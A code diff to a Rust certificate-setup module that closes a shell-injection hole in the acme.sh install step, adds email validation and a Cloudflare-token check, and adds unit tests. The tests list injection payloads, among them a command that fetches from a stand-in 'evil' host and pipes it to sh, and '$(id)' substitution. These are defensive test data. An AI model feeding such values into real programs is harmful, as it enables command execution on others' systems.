@@ -23,19 +23,34 @@ pub fn ensure_acme(
     if domain.is_empty() {
         anyhow::bail!("domain required for real cert");
     }
-    if which::which("acme.sh").is_err() {
-        info!("installing acme.sh ...");
-        let status = Command::new("sh")
-            .arg("-c")
-            .arg(format!("curl https://get.acme.sh | sh -s email={email}"))
-            .status()?;
-        if !status.success() {
-            anyhow::bail!("acme install failed");
-        }
+    if !email.is_empty() {
+        validate_email(email)?;
     }
-
-    let acme = PathBuf::from(acme_home()).join("acme.sh");
-    if mode == CertStrategy::AcmeDnsCf && !cf_token.is_empty() {
+    if mode == CertStrategy::AcmeDnsCf && cf_token.is_empty() {
+        anyhow::bail!(
+            "Cloudflare API token required for acme-dns-cf; re-run setup and provide one \
+             (DNS edit scope), or choose another certificate strategy"
+        );
+    }
+    let acme = match acme_bin() {
+        Ok(bin) => bin,
+        Err(_) => {
+            info!("installing acme.sh ...");
+            // Email is passed as a positional shell parameter; never interpolate
+            // user input into the command string.
+            let status = Command::new("sh")
+                .arg("-c")
+                .arg(r#"curl -fsSL https://get.acme.sh | sh -s -- email="$1""#)
+                .arg("sub-maker-acme-install")
+                .arg(email)
+                .status()?;
+            if !status.success() {
+                anyhow::bail!("acme install failed");
+            }
+            PathBuf::from(acme_home()).join("acme.sh")
+        }
+    };
+    if mode == CertStrategy::AcmeDnsCf {
         let output = Command::new(&acme)
             .args([
                 "--issue",
@@ -140,7 +155,7 @@ pub fn copy_certs_to_etc(domain: &str) -> anyhow::Result<()> {
     if !src.exists() {
         src = PathBuf::from(acme_home()).join(domain);
     }
-    let dst = PathBuf::from("/etc/sub-maker/certs");
+    let dst = certs_dst_dir();
     fs::create_dir_all(&dst)?;
     copy_file(
         &src.join("fullchain.cer"),
@@ -158,7 +173,7 @@ pub fn copy_certs_to_etc(domain: &str) -> anyhow::Result<()> {
 
 pub fn copy_certbot_certs_to_etc(domain: &str) -> anyhow::Result<()> {
     let src = PathBuf::from("/etc/letsencrypt/live").join(domain);
-    let dst = PathBuf::from("/etc/sub-maker/certs");
+    let dst = certs_dst_dir();
     fs::create_dir_all(&dst)?;
     copy_file(
         &src.join("fullchain.pem"),
@@ -228,9 +243,71 @@ fn command_exists(name: &str) -> bool {
     which::which(name).is_ok()
 }
 
+/// Prefers the acme.sh installed under `~/.acme.sh`, then one on PATH.
+fn acme_bin() -> anyhow::Result<PathBuf> {
+    let home = PathBuf::from(acme_home()).join("acme.sh");
+    if home.is_file() {
+        return Ok(home);
+    }
+    which::which("acme.sh").map_err(|_| anyhow::anyhow!("acme.sh not found"))
+}
+
+/// Accepts ordinary contact emails only; rejects anything that could not
+/// appear in an ACME registration anyway (and that would be hostile in logs).
+pub fn validate_email(email: &str) -> anyhow::Result<()> {
+    let (local, domain) = email
+        .split_once('@')
+        .ok_or_else(|| anyhow::anyhow!("invalid email: {email:?}"))?;
+    let ok_local = !local.is_empty()
+        && local
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'%' | b'+' | b'-'));
+    let ok_domain = !domain.is_empty()
+        && domain
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-'))
+        && !domain.starts_with('-')
+        && !domain.starts_with('.');
+    if ok_local && ok_domain {
+        Ok(())
+    } else {
+        anyhow::bail!("invalid email: {email:?}")
+    }
+}
+
 fn acme_home() -> String {
     let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
     format!("{home}/.acme.sh")
+}
+
+#[cfg(test)]
+mod tests {
+    use super::{ensure_acme, validate_email};
+    use crate::config::CertStrategy;
+
+    #[test]
+    fn ensure_acme_requires_cf_token_for_dns01() {
+        let err = ensure_acme("proxy.example.com", "ops@example.com", CertStrategy::AcmeDnsCf, "")
+            .expect_err("empty CF token must not fall back to HTTP-01");
+        assert!(err.to_string().contains("Cloudflare API token"));
+    }
+
+    #[test]
+    fn validate_email_accepts_plain_addresses_and_rejects_shell_syntax() {
+        for ok in ["ops@example.com", "a.b+c@d-1.io"] {
+            assert!(validate_email(ok).is_ok(), "should accept {ok:?}");
+        }
+        for bad in [
+            "x; curl http://evil|sh",
+            "a`b@x.com",
+            "$(id)@x.com",
+            "no-at",
+            "@x.com",
+            "a@",
+        ] {
+            assert!(validate_email(bad).is_err(), "should reject {bad:?}");
+        }
+    }
 }
 
 fn copy_file(src: &Path, dst: &Path, mode: u32) -> anyhow::Result<()> {
